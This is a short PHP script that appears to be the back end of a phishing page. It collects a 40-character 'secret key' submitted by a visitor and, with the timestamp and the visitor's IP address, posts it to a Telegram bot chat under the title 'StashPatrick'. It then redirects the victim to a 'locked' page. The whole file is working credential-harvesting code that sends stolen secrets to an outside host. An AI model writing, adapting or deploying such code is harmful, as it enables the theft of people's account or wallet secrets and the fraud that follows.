<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the submitted secret key
    $secretKey = isset($_POST["domaincode"]) ? trim($_POST["domaincode"]) : '';
    
    if (strlen($secretKey) !== 40) {
        header("Location: index.html?error=1");
        exit();
    }
    
    date_default_timezone_set('Asia/Kolkata');
    $dateTime = date("Y-m-d h:i:s A");
    
    // Get user's IP address
    $userIP = $_SERVER['REMOTE_ADDR'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $userIP = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    
    // Compose the message
    $message = "🔐 Secret Key: " . $secretKey . "\n";
    $message .= "📅 Date/Time (IST): " . $dateTime . "\n";
    $message .= "🌐 IP Address: " . $userIP . "\n\n";
    
    // Telegram Bot details
    $botToken = '__TELEGRAM_BOT_TOKEN__';
    $chatIds = ['1272510733'];
    
    $messageTitle = "StashPatrick ✅";
    
    // Send to Telegram
    sendTelegramMessage($messageTitle, $message);
    
    // Redirect to locked page
    header("Location: /locked/");
    exit();
} else {
    // Redirect back
    header("Location: /check-protect/");
    exit();
}

function sendTelegramMessage($title, $body) {
    global $botToken, $chatIds;
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    
    foreach ($chatIds as $chatId) {
        $data = [
            'chat_id' => $chatId,
            'text' => "*" . $title . "*\n" . $body,
            'parse_mode' => 'Markdown'
        ];
        
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        
        curl_exec($ch);
        curl_close($ch);
    }
}
?>
